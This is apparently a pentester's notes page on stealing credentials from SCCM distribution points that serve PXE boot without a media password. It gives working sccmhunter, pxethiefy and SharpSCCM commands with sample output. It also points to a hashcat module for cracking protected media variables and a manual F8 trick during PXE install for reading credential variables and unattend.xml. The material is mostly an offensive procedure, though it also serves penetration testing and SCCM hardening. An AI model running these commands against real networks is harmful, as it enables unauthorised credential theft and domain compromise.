---
title: SCCM PXE Boot
---

You can steal credentials from SCCM distribution points without authentication if PXE boot is configured and no PXE password is set aka the media variables don't have password protection.

Discover SCCM servers and check if they provide PXE boot.

=== "[[notes/tools/sccmhunter]] + [[notes/tools/pxethiefy]]"
    ~~~
    ❯ sccmhunter smb -debug -dc-ip dc01.corp.local -d corp.local -u jdoe -p 'passw0rd' -save
    [13:42:00] DEBUG    [+] Found \\sccm01.corp.local\REMINST\SMSTemp\2023.05.16.15.00.29.0001.{11111111-7021-4D21-A7AC-522D2B0EDC6A}.boot.var
    [13:42:00] INFO     +----+--------------------+-------------+------------------+---------------+----------------------+--------+---------+
                        |    | Hostname           | Site Code   | Signing Status   | Site Server   | Distribution Point   | WSUS   | MSSQL   |
                        +====+====================+=============+==================+===============+======================+========+=========+
                        |  0 | sccm01.corp.local  | CRP         | False            | True          | True                 | True   | True    |
                        +----+--------------------+-------------+------------------+---------------+----------------------+--------+---------+
    ❯ sudo pxethiefy explore -a sccm01.corp.local
    [+] Successfully decrypted media variables file with the provided password!
    [+] You can use the following information with SharpSCCM in an attempt to obtain secrets from the Management Point..
    SharpSCCM.exe get secrets -i "{66666666-44e4-4755-af3b-4b5504c6b397}" -m "88888888-07e8-488c-9426-49ec1e1c2c63" -c "30821A1..." -sc CRP -mp sccm01.corp.local
    ~~~

If password protection is present you need to compile the [ConfigMgr CryptDeriveKey Hashcat Module](https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module) and try to crack the password.
Otherwise you can boot a Windows laptop via PXE, begin the installation and press *F8*.
Then check the environment variables `_SMSTSReserved1` and `_SMSTSReserved2` as well as the `C:\Windows\panther\unattend\unattend.xml` file for credentials.

Other tools:

- [PXEThief](https://github.com/MWR-CyberSec/PXEThief), original tool by Christopher Panayi, requires Windows

References:

- [Pulling passwords out of Configuration Manager - Christopher Panayi - DEF CON 30](https://www.youtube.com/watch?v=Ly9goAud0gs)
